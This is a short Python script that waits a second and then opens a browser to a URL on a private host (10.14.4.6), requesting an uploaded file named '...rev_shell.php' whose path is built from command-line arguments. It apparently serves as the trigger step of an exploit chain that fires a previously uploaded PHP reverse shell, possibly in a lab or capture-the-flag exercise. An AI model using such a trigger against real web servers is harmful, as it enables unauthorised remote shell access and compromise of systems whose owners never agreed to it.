import webbrowser
import sys
import time

#possibly just wait a few seconds first

time.sleep(1)
name = sys.argv[1]
idstr = sys.argv[2]

webbrowser.open('http://10.14.4.6/upload/'+idstr+'/'+name+'/'+name+'rev_shell.php',new=2)
